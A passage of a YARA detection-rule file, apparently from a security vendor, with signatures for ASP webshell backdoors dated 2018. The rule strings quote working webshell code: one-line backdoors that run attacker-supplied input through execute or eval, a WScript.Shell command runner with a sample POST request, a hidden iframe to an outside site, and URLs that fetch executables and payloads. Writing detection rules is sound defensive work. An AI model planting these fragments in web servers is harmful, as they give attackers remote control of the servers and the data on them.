        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "775a418c78dc4809ebd8323ba14fdb5ecef6f108ddada2625f95a1594f8550f7"
     strings:
        $s1 = "`k+V(lb.ljDn\\M+j D/+!5+\"'S\"iE#*@#@&s;x^ObWUPU4kUlUo!x`j4b?Cx}8N/OM#@#@&?4kUCx}4%/DD~x,I+asl1+`U4r?mx}4%/O.BPE" fullword ascii
        $s2 = "+A~wqs@#@&w?OlMO,'~&xUYDvsAUNBK(xBJWr^+xmh+{JJrSq#3FZ@#@&s3U9PxP&U?DDcoUYl.OBK(xBErJEBF*@#@&w?DCDDPxP&xjOM`sAUNBKq" fullword ascii
        $s3 = "^@!@*D8@!@*w@!@*.(@!@*D(@!@*w@!@*D(@!@*a@!@*.4@!@*.4@!@*.nDx+1&@!,iwk8U[pwk4U[I2k4U[@*n:mDWrJ@!@*TT8'OtTr" fullword ascii
        $s4 = "!*[m4.ccF#Lm4Dcq8*b[14Dv,1bLmt.c8F*#L^4Dc8!l#[1tMcF8 b[1t.c8Fv*'m4D`++b[1tM`q&b'1t.`8T#@#@&j4b?lUxr4;/,[" fullword ascii
        $s5 = "@#@&~,/+O~:&xZMnmYn}4N+mD`}8KvvS!*#@#@&,K&c\\W9+'2~lP:&cKzwnx8PlP:fR}wnU@#@&PPqcwG/bObWU{sbV+UYm.Y@#@&~K8R^GaXYK~K2~sbsn?by" fullword ascii
        $s6 = "Pks+6ED'RqrP[,-4;DS6~'PrOA62k.n{!EPL~\\(Z.J6P[~E ICYbG`wx8J,[P74;.S6P'P|@#@&~,PP,~P,JO\"COkKfKhU'qE,[~\\(/Dd0~',JO]CDkG/;." fullword ascii
        $s7 = "YPK?D.+m:~',1GO4kxT@#@&AxN,o;x1YbWU@#@&o!x^YbGx,tna9+mcdDDrx*~@#@&9b:,k~,LB~3BP.+kEsO,@#@&Mn/!VY,x~!,@#@&sGD~r,'~F,PW,SnUv/Y.r" fullword ascii
        $s8 = "Dxj5Srd3f~RFpKC/khKD['E'ald/SGD9[EI`/+.~&fxJLr9)dDD5E+MX,xPr+a+1PhCkY+M N(WRX2mmtNkCnSs~EJ~[,.+$EndDR0G.s`EHt9r#~LPrBJ=/" fullword ascii
        $s9 = "+9?+1EMn'ZJ~[,\\8/MS0,'PrOCb[nCbN9+U'TE,[~\\(/Dd0~',JO)sSlz/zs^WAdWTkx{!r~[,\\8ZMSW~LPJ /tmxo" fullword ascii
        $s10 = "YOdr.+lF82XiNr@#@&LJ@!zkOX^+@*J@#@&rW,4/{OD!+PD4nx=Lr@!dm.raY~/M^'r[4Oa[Jq N/@*J=n^/n=Lr@!/1Db2Y@*Jl+" fullword ascii
        $s11 = "@!zD[@*r@#@&%r@!Y[@*@!kUw!O,xCs+{BwKDDvPDX2+{BOnXYB,rN{BwK.OB,\\mV;+xvW&1*Rv@*@!zO[@*J@#@&%r@!&YM@*r@#@&NJ@!YD,l^ro" fullword ascii
        $s12 = "@!J4@*@!&C@*@!z:f@*@!&PzAJ2@*@!A\"@*E@#@&LJ@!&wr]H@*@!JK]@*@!JKb~SA@*@!~I@*@!Gq#~mVkTU'1+xDn.@*@!s}I\\P)^DkGx{_b1YrG" fullword ascii
        $s13 = "[sswoosEPmVroUx^+WY@*E[}4Pcb~ b'r@!&Y9@*@!zOM@*r@#@&g+XO@#@&L~?&@#@&3MDR;s+mD@#@&W;x1YbWUPLnDCPKhKlT+c;MV#~@#@&WUP" fullword ascii
        $s14 = "UZ]qhPRUC3JdJ#@#@&\"l[:bUhlO4'rC|A5|Jr;bJ{tb/u&12'j5UK2tw]b9:bxw\\+ Z-j+M-+M-KCMl:nO" fullword ascii
        $s15 = "6[,JZm/+v4n6kYM#@#@&3U9P(0,@#@&g+aO@#@&2U[,s;x1ObWU@#@&;qs,',]+$En/D`E2mYtrb@#@&q0,/(s,@!@*PEJ~P4+UP@#@&AbxjOM'?O." fullword ascii
        $s16 = "lsKD:{9q`w#=+s/nlwW.:{EJ=+U[,k0@#@&,P3x9~wEU1YbWx@#@&@#@&P,n;4^k^~wEx1OkKxP`)cs*@#@&sxV^Ck+cs*@#@&&0~9yR+arkYd`wb,Y4" fullword ascii
        $s17 = "x9Pk6@#@&nVk+@#@&@#@&dr{J@!1nxD+D@*@![k7PkYzVnxEhrND4)l!T2Xi4G.9+.)82XPdKVbNP[ y+ial[NbxLly wXI:mDobUlFZ!a6IB@*@!mP4D" fullword ascii
        $s18 = "@!&(@*@!zm@*@!JK9@*@!KI~^^ld/{P~K9@*P@!sr\"H,CmDkGx{PhnDtW9xnK/Y@*@!Pf,l^kLxxhbN[V" fullword ascii
        $s19 = "bIYKwctrNnWKDhRwHls+ -mVEn~3'~Jrk-ukrJ3f1m:" fullword ascii
        $s20 = "P'~dDD]+D;Mx~LP;tDvK4r/;tCD;W[n*P@#@&3Vk+P@#@&H+XY;tCD/G9+~',)/1Ac\\bNAc-&xSk8Q8~q*#,@#@&kYM]+DE.x,'~dDDI" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5f829770576685a311ea69acdfcd92593da1bf41
{
     meta:
        description = "asp - file 5f829770576685a311ea69acdfcd92593da1bf41.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d9a6f57a4d219f31dc860ff7ae2e2b3da2e2687a28639a1820d0c1226b5feda5"
     strings:
        $s1 = "<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"sz\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0864f040a37c3e1cef0213df273870ed6a61e4bc
{
     meta:
        description = "asp - file 0864f040a37c3e1cef0213df273870ed6a61e4bc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "39aa15a407cfa6b121041263db518c16755ffb88b9eb7baa735fbf70c952b4c5"
     strings:
        $s1 = "a=Response.Write(CreateObject(\"WScript.Shell\").exec(\"ipconfig\").StdOut.ReadAll)" fullword ascii
        $s2 = "POST /ss.asp? HTTP/1.1" fullword ascii
        $s3 = "Send the following POST request in order to send your command" fullword ascii
        $s4 = "<%execute Request.Form(\"a\")%>" fullword ascii
        $s5 = "Host: 127.0.0.1" fullword ascii
        $s6 = "Content-Length: 83" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3175ee00fc66921ebec2e7ece8aa3296d4275cb5
{
     meta:
        description = "asp - file 3175ee00fc66921ebec2e7ece8aa3296d4275cb5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f24a2be2fcaee3aa91ae068d07076ef28a73d3e20e290300f8a5a213932c7825"
     strings:
        $s1 = "Fso.CreateTextFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s2 = "Fso.DeleteFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s3 = "<input name=\"sPath\" type=\"text\" id=\"sPath\" value=\"<%=ShowPath%>\"  style=\"width:500px;height:25px\">" fullword ascii
        $s4 = "Set Fso=server.createobject(\"scr\"&\"ipt\"&\"ing\"&\".\"&\"fil\"&\"esy\"&\"ste\"&\"mob\"&\"jec\"&\"t\") " fullword ascii
        $s5 = "<form name=\"form1\" method=\"post\" action=\"\">" fullword ascii
        $s6 = "<input style=\"width:160px;height:28px\" type=\"submit\" name=\"button\" id=\"button\" value=\"" fullword ascii
        $s7 = "ShowPath=\"C:\\Program Files\\\"" fullword ascii
        $s8 = "Set Objfolder=fso.getfolder(path)" fullword ascii
        $s9 = "response.write \" <font color=red>" fullword ascii
        $s10 = "response.write \" <font color=green>" fullword ascii
        $s11 = "response.write \" <font color=green><b>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule sig_73d1d98465e4119ddd41512b3be7afca04c105b5
{
     meta:
        description = "asp - file 73d1d98465e4119ddd41512b3be7afca04c105b5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
     strings:
        $s1 = "Webshell Mumaasp.com" fullword ascii
        $s2 = "xOZKP=nMlN_nN9RbknGxkw\"+n=0=wOiK,=P{+O.ktl /k+Gxk2\"+|m:M+/DY O+KmUzbWCObmw^Cw,UP{2nKHxDYnWU ;/nW" fullword ascii
        $s3 = "+.)UaYg+blK/PK~ vq%2+OPc,[K/_h#*~Fb~SPDDOdT+Nv\\k1`bk'~D,?D+APU~{Y.hUU+*)O.D/onUvSnW,~:Pq,',kWM)wODS?U+BP~rb:)Gd#hW~,O.Yko" fullword ascii
        $s4 = "BPDXan'EtrN9+Uv,kN{v?`lmDrGxEP7lsEnxE v@*@!&0KDh@*r@#@&]]UJ@!/1.bwO,Vmxo!lTn'ELC\\m/^.bwYE@*J@#@&I\"jENKm!:nxO SDrY" fullword ascii
        $s5 = ";EG8?DDU*|rxT'EV2l[[EP^+^Uo{BTdalmr~1+sVMxE!v(WMN+EvlTBbNOt{4sn,h[?@!Ym?q{j(!E@*?=GxxvEPCmDrwK/Ov4WNxvEPh+D8wW.s:" fullword ascii
        $s6 = "B,\\CV;n{BfB@*@!z6W.h@*J@#@&]\"?E@!k^Mk2DP^lxTEmL+{B%l7ld^MkwDv@*r@#@&\"]jJ9W1Eh+UOch.kDn`E@!8.@*@!mnUD+.@*" fullword ascii
        $s7 = "DPr'0!/+M'EP,wm/dPE'6wC/k'J,lO~aWDO~r[~0aGMY~LJ,tl7+,[+^+O+9@!&[b\\@*r@#@&i+Vkn@#@&idM+dwGUk+ hMrY" fullword ascii
        $s8 = "UserPass=\"mumaasp.com\"'" fullword ascii
        $s9 = "P|lO'hU~+{.mKE~jDlfCTpc Ac3GrJDRx+YcW6G/1D\\kM'[n7kDKSnLUY4KCUL+{D^W;~UYCfmTiWR$ AfrJOc9nYcG6Wd1DtkD{N" fullword ascii
        $s10 = "4jqxj&@*==AUN,qW|m4Vn@*M@*@!zD[@*@!&DB@*@!zDsAo2wDxB[2~^KVWL=@!4D?&xjq?={1GY4nDP]/Kd+=?]dcZVrUT=()U({I]UPUUU#2^d+,=s?DDbO" fullword ascii
        $s11 = "=nD^NoG4+PD~[DD`kn.V9sKYn+C^M#|q6[PAx|dv2WnOc?C:MnkYb#U*xYD+KU+;ksU6/c~MY+MrRql:MndY#Py#St=CD+KY4cUM/'~MP/On,ksWwn:l-c?m:D" fullword ascii
        $s12 = "kxv8!!Ar9Y4@*@!O9P'?@!DD?&'U(Y9@*==JY[@*?UU?@*@!(?YM'=U?[GlsEnxF!vP7[Y4)*n{Bhr~kYzV(jDDvs+{Bf!Y,Ul@*@!rxa[=@!DN?&x?&=wDrGx" fullword ascii
        $s13 = "+9?+1EMn'ZJ~[,\\8^MV0,'PrOCb[nCbN9+U'TE,[~\\(^D^0~',JO)sSlz/zs^WAdWTkx{!r~[,\\8mMVW~LPJ /tmxo" fullword ascii
        $s14 = "(f:C=PqwaI,A6IG3I A6P:rHR/}S6I=~[!TR!Z!i,Z}Jr\")~aZ!WWZ!i,$r\"f2\"RPrhO;rJr]l,aT!RT!Zi~o}1KRozH(SIl,\\nMNmxlpP~6IG2]O\"q!u:O" fullword ascii
        $s15 = ":w'wEJ*B@*Kn:2@!Jl@*:Q@!l,t.n6'B%C7ldmMraYlUtKhsKV9nDvJEZ=-w]AZ5;J2\"--rEbB@*IAZeZJ3\"@!&l@*-~@!l~4M+0xvNl-lk^Mk2D)UtWSsKsN" fullword ascii
        $s16 = "Pd.1'YndDRC/aa,hr9Y4',l!,4+bo4Y{&TT@*@!zbWDm:+@*~E)\"+kwGxdnch.kDnPr@!8.@*@!4.@*@!w@*@!(.@*@!2@*@!(D@*@!4M@*@!a@*@!4M@*@!^" fullword ascii
        $s17 = "D-n#UPD4+DU#{=cUaWMRoW.h$En/Dr0,DnU#%,S*2&f~2fW*S8c8&,BcBq&l~T~8FTSy*~R+FB &bdO'?nKDOS1XRU|+^d+#:c=aWY oKDn;!nkkdD'MnWMYd.Y?#|+" fullword ascii
        $s18 = ";;+kORwW.hvJ02Ck/E#@#@&6wGMY,'PM+$;+kY sKDhcr0wK.Yr#@#@&W2lDt,'~Dn5!+dYcoWM:cE6wlO4r#@#@&a.b\\r^+T+'M+$;+kY sKDhcrwDb-k^+o" fullword ascii
        $s19 = "B@*!@!zWWUO@*@!8D@*E[wRHCs+[E@!Jl@*J,@#@&?({?&[J@!4M@*@!(@*,@!J4@*@!mPtMn0{BLm-C/1DbwO)o;^VoWMh`rJE'\"+nCO4`KlD4LJwr[wR1m:" fullword ascii
        $s20 = "6D@#@&U+D~6hWdY,'~/M+lDnr(L+1OcJt?oHJ  ptSuK:KJ*@#@&ahW/O }wnx,Ehrj:JBPJ4YD2)Jzq FRT ZRF=E[,wWMO~[rz^+C\\ndr~~KM;+@#@&aKK/Y j" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule e67bc9bbbcd57796d78c80daa1cb15ade4f35fbf
{
     meta:
        description = "asp - file e67bc9bbbcd57796d78c80daa1cb15ade4f35fbf.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b42079f09f2a2c67519084e18b9e12a3c32cd1f60aaa65cdbfbb18e6835e367"
     strings:
        $s1 = "JL+W[E@!JY.@*@!&Ym4sn@*J@#@&%r@!4D@*@!DD@*@!Y9@*@!bxa;Y,WUHKEdn}\\+MxJrYtbd /DX^+ m;.kW.'E4l" fullword ascii
        $s2 = ":http://www.howao.com" fullword ascii
        $s3 = "rl3DMR;Vnl.lAx[P&W)U+O~:'1GO4kUo=6(Kcb~8#'&/}8L=1n6D)(W,sW^[+MnlD4@!@*rJ,Y4+UlU+d/bGxvJoG^N+.KmY4J*x\"InhlDt`wW^[+MnCY4#l3" fullword ascii
        $s4 = "~~rBPFb~{PEmr~}D~tk9`/DDbU~,kSP8#~x,JZr~K4+x,@#@&PNP{Pq ~@#@&2UN,(0,@#@&(6PHr[v/ODbUBPrBP8#P{Pr8J,r.Ptk[ckYDbU~,k~,qbP{PrAEPP4" fullword ascii
        $s5 = "/OvJhDWwk^nJ*[EZKxEb{l/4Ghbm@#@&nUN,k6@#@&L~)awsk1CYbWUcM+;;nkYcJh.Ksr^+r#[rZKUJ*@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!mnxOnM@*" fullword ascii
        $s6 = "6cKKDY).Mlz`8b*#';?DD`_+XcnKDObMDCzv!#*b#@#@&2^dnP@#@&NJ3D.GM\"~ZmUBDP]nmN\"E@#@&2UN,(6@#@&Ax9Ps!x1OkKx@#@&wEU^DkW" fullword ascii
        $s7 = "=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s8 = "=\"http://lpl38.com/web/pr.exe\"'" fullword ascii
        $s9 = "=\"http://lpl38.com/web/aspx.txt\"'" fullword ascii
        $s10 = "=\"http://lpl38.com/web/php.txt\"'" fullword ascii
        $s11 = "Y~6l1+'EhbUo9kUokB~^KVWMxB[&&6WT!EPkk\"+xv2B@* @!&0KxO@*,J@#@&~,2UN,(6@#@&Ax9Ps!x1OkKx@#@&wEU^DkW" fullword ascii
        $s12 = "@*Nx9k,NY@!@*E.+DxnmE'ULbVl,.Y@!@*DD&@!@*9YJ@!@*B.GDl.Ykrxb:[)^lmGJE'nE^C7PvM+kENE'9rPE6GAD6nPE'/kCV1PBDanYE'" fullword ascii
        $s13 = "s@!Jl@*P@!l~4M+0{vLm\\lk^.kaY=s;VsoKDh`rEJLInKmYtcKmY4[rwr[Jc1m:+*[rEJBJEZKwzobV+rE#EPm^Cd/{Bm:vPOrDVn'E" fullword ascii
        $s14 = "=\"http://lpl38.com/web/\"'" fullword ascii
        $s15 = "=\"HTTP://www.howao.com/\"'" fullword ascii
        $s16 = "/ORUnD7+.#mDkC8^+d`rjAI#AI|?rwKq)IAJb[r@!&O9@*@!JOD@*J@#@&oGD,k{!~KG~8%@#@&U('Uq'E@!YD~C^kLx{v1+UD+MB@*@!Y9~t" fullword ascii
        $s17 = "jucI2V]2zf`\"C[:bxhlOt~',nGDD~#@#@&(W,q/).Mlz`hGMY)MDmX#,K4nx,@#@&L,nG.DP[rlJ,@#@&N~4+XYKkUYn.vZjYMcC" fullword ascii
        $s18 = "PxPZ@#@&,Por^+?OCMYxPZ@#@&P~Ax9P?!4@#@&P,n;4^k^~6Ex1OkKxPUC-+z/vsb@#@&~,Nr:,P&@#@&~~Ul\\n)k'OD!n@#@&~,k6PYMkscs*'EJ,W.~wkV" fullword ascii
        $s19 = "NFvErPOXan{4;DYKxP7l^;+{B(x6W.hmYkKUB@*@!zD[@*@!JYM@*@!Y.@*@!Y[P4nkTtOxW@*@!&O9@*@!zD.@*@!OM@*@!YN,\\mskTxxJrYG2rJPmskTx'1nUY" fullword ascii
        $s20 = ":http://www.howao.com " fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_499129d0e7b8aa97211aa29541504db85025c445
{
     meta:
        description = "asp - file 499129d0e7b8aa97211aa29541504db85025c445.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3dbe68406df840d46857ef9d7a5e0352d6c38ba08fd9ccdf39e0b39e78904412"
     strings:
        $s1 = "<iframe src=http://cpc-gov.cn/a/a/a.asp width=0 height=0></iframe>" fullword ascii
        $s2 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
        $s3 = "<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">" fullword ascii
        $s4 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
        $s5 = "<td><table width=\"700\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\">" fullword ascii
        $s6 = "PE@!D+aOmD+m~xm:+{^z09NmYCP^G^/x%Z~DKhdx8!PAr9Y4'2+@*@!&D+XYlM+m@*J,ShsAAA==^#~@%>" fullword ascii
        $s7 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s8 = "Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbb,MhMAAA==^#~@%>" fullword ascii
        $s9 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule b977c0ad20dc738b5dacda51ec8da718301a75d7
{
     meta:
        description = "asp - file b977c0ad20dc738b5dacda51ec8da718301a75d7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5716f68615e9175e2b9b76a682e60952952711d6a3738ffee6502b5e9c9a44ab"
     strings:
        $x1 = "{var a=new ActiveXObject('wscript.shell'); var exec=a.Exec(x);return exec.StdOut.ReadAll()+exec.StdErr.ReadAll(); }</msxsl:scri" fullword ascii
        $s2 = "xlst=\"<?xml version='1.0'?><xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msx" ascii
        $s3 = "xml=\"<?xml version=\"\"1.0\"\"?><root >cmd /c dir</root>\"" fullword ascii
        $s4 = "pt><xsl:template match=\"\"/root\"\"> <xsl:value-of select=\"\"zcg:xml(string(.))\"\"/></xsl:template></xsl:stylesheet>\"" fullword ascii
        $s5 = "response.write \"<pre><xmp>\" & xmldoc.TransformNode(xsldoc)& \"</xmp></pre>\"" fullword ascii
        $s6 = "Set xsldoc = Server.CreateObject(\"MSXML2.DOMDocument\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_27a020c5bc0dbabe889f436271df129627b02196
{
     meta:
        description = "asp - file 27a020c5bc0dbabe889f436271df129627b02196.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6038f0600baf121cef39c997a296fddac8a67f0d1c24fc4478451d11496ecdb7"
     strings:
        $s1 = "- F4ckTeam<p/><table width=\"\"450\"\" border=\"\"1\"\" cellpadding=\"\"10\"\"><tr><td><div align=center></td></tr></table>\"" fullword ascii
        $s2 = "sW^[nDu y]+ Y+O]{AGHls+Y+Z]&9Yy!2DKhaYYy%u  u yYERAoGuE0oO&]!XF+*]!{1s~]!*+b0Y!*+&ZYEFv33u !Y;+%TGu;+*0F]!c2wvu;*O&1]!*q" fullword ascii
        $s3 = "xO]29u +u yY+XYJ4YsVY&~]+T1tlMd+D]&GL8 2Fy]+ Y+y]f2ufZJtnC9]&3Y2Z8W9zu TKxsWEk+K-+M]ffu +Yy hbUNKhRkOCY!/u&9]+{uE*2;X]!," fullword ascii
        $s4 = "@!zm@*@!zDN@*@!JYD@*E@#@&L4r@!OD@*@!DN~tnrTtO'E+!E@*@!C,tDnW{B%l7Ckm.bwD)s!V^oWM:cJrJ'.AnbD4`k+/kr6xvJwWsNn.hlOtrb[r-HnSsWs[" fullword ascii
        $s5 = "K,Q~FZ#,@!~N3HG@#@&P,~P,P[rA1f~x,kU/D.~`9UYzDKBY9)~7A/I^0~',\\A1.Vw#_2@#@&P,P,P~K+ D5K2,xP8Pl~: R\\6G2~'2~=POyRKw+" fullword ascii
        $s6 = "@!&Y[@*@!Y[P(LmKVG.{Bav@*,@!&Y9@*@!Y[,4TmW^WMxB[B@*JLhG.bxk(C[r@!zD[@*@!JYM@*E)a~v:h#=oWMPrxZPKG~8&l?&xUq'r@!DDPmVbLx{B^+" fullword ascii
        $s7 = "Du +]++u 1]F$fglhnu !YfG]+!a.K:2D]y%]y u+ uE0AwGY;Rs,2YElFvlY;%O%8];vX$Z];*AobuE{" fullword ascii
        $s8 = "@!Jl@*@!JON@*@!&OM@*J@#@&N4E@!D.@*@!O9P4+kTtDxBy!v@*@!l~4M+0{vLm\\lk^.kaY=?4WAoKV[+McJrJ'.AnlP4vIGWDKzY4*[rJJ*B@*" fullword ascii
        $s9 = "YERAoGuE0oO&]!XF+*]!{1s~]!*+b0Y!*+&ZYEFv33uEv0TF];vl0F];W2wv]!*Of,uEXF+%Y;lc!GYEF,sZY+ u y]+ZoHm:n]y1]2AOGaRtr[" fullword ascii
        $s10 = "lh+uXZu {YyZ]X/u {wmdkhGMNu*Zu FY O]+ u +Y2A?D.]lAvuX9]y!u&9]+Tu +]y+fAS3PA] To\"r\\]yTu*$:l(V+glsn]lfY Z" fullword ascii
        $s11 = "Yy!]!Xcl%]!X$%O]!*qv0Y!v0ZZYE+f*$uEGX+R]+Zu;RAoF]!* zFu;cwGo]!GX+R]EW3%A]EO{X2u Z];v/9l];Gl+%uE1T8c]+/uEXcZ3uE" fullword ascii
        $s12 = "jz/D+sr8Ln^DJbP,~@#@&?nO,PPW~,PxP,WkW V+Dsk^+v6!}!bP@#@&rW,P0cCYDDk(;O+kP@!@*~&1~Dtnx@#@&0clOOMk4;O" fullword ascii
        $s13 = ".D]+R?DD]lAbY*G]+,u&$YFf+^d+uGAG8oWM:c?5VjOMR-l^;+u TY2f]+TUY.]l$b]XG]2A]FfMnY!DU]y!O.!+]2$]Ff]y+Y&zL(]+ W;" fullword ascii
        $s14 = "Y Z]&GY+!G1m:n]f$uG9+^d+u Tr6] 0ozmOkKUu&9u&G] y]y+ZK:2l1Y\\[(] yY y] OY{AG1m:n]+Tu&9]yTwMWh2D] 0Yy Y yY!%$wGuE%w,2YElF" fullword ascii
        $s15 = "Y O]&~Arx9WSRdYCO!/Y&GY y]++uEsoT8]; 81y]+Z]y!O ]y+]y QNb/2smX]2$]FfD!U/VKm0]+%Y+O]fAu+ u&)%(] +W!x^YbG" fullword ascii
        $s16 = "]y Y Z]f/JYkDs+u&2u++]2bN4Y +Y2ZdYHs+u TOHw+YfG]+ u+yYnXYJm/k]y+]y Y&A]++u&bN8]y 4K[z]yZDNYG$WKxOOkry" fullword ascii
        $s17 = "D.WM]f90kV^3DMWDkYfAu y]fb%8u +0!UmDkGUu !znkWV]y0u 1uG~k0u ZY RmGx6k.hu %u+ u  u;{%+2uE0A)*uE0,Rq]!v+" fullword ascii
        $s18 = "1Cs+u*fu Z9I}nY ZZ6J`H1u+!hb?UY+ u y]fAjOM]XA8+]lfYfG] TYy Y yY!*ol&uE*22zYE+vf2uE{12b]yT]!c2ZTYE+G+FYE" fullword ascii
        $s19 = "mO(}1P\\672WW^9AIchb:t#@#@&hCY4PxPUns(D`nzOtBJu-kkJ*@#@&koP^WcsGV9nDA6rdD/`2C:Cc!*b,bU9PhlY4`8b@!@*JEPDC3H@#@&Zw HK.+w6Jf" fullword ascii
        $s20 = "#@~^tnQBAA==@#@&/;(PUtWS2M.`*@#@&q6P3.MPK4nx@#@&L(E@!4M@*@!l~t.n6'vLm-lkm.raY)4rkYGDH (l^0`*B@*@!4M@*[" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_09b16331f2e3574458fdc905b3d9515ca7278ad6
{
     meta:
        description = "asp - file 09b16331f2e3574458fdc905b3d9515ca7278ad6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "069ea990d32fc980939fffdf1aed77384bf7806bc57c0a7faaff33bd1a3447f6"
     strings:
        $s1 = "if Request(\"sb\")<>\"\" then ExecuteGlobal request(\"sb\") end if" fullword ascii
     condition:
        ( uint16(0) == 0x6669 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f1a13af63b82fc9f61a01c77480f17478ea6d6dc
{
     meta:
        description = "asp - file f1a13af63b82fc9f61a01c77480f17478ea6d6dc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
     strings:
        $s1 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s2 = "thing:ScReWr = ReWrStr:End Function:Sub CustomScanDriveForm():execute(king(\"yo rft" fullword ascii
        $s3 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s4 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
        $s6 = "j\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\">\"" fullword ascii
        $s7 = "execute(king(\"yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg " fullword ascii
        $s8 = "execute(king(\"ufoizgG = tsoXtiz ztU:yo rft:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'" fullword ascii
        $s9 = "Function ScReWr(folder):On Error Resume Next:Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(C" ascii
        $s10 = "Function ScReWr(folder):on error resume next :Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(" ascii
        $s11 = "execute(king(\"`>zhokel/<;'`&skx&)`tdqf_ktcktl`(zltxjtk&`//:hzzi'=fgozqegs.zftkqh>zhokel<` p" fullword ascii
        $s12 = "</center>\":SI=SI&BackUrl:j SI:Response.End:End If:If Path<>\"\" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.rea" ascii
        $s13 = ":openUrl=\"/\"&theUrl&\"\"\" target=\"\"_blank\":Else:openUrl=\"###\"\" onclick=\"\"alert('" fullword ascii
        $s14 = "execute(king(\"tszoJkzl = tszoJnTztu:)izqYktvgY,ltzxwokzzQ.tfBtiz(ltzxwokzzQztu & ` :" fullword ascii
        $s15 = "execute(king(\"trgetr=tktivnfQeY" fullword ascii
        $s16 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
        $s17 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
        $s18 = "execute(king(\"kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC" fullword ascii
        $s19 = "Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))" fullword ascii
        $s20 = "j\"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(\"\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

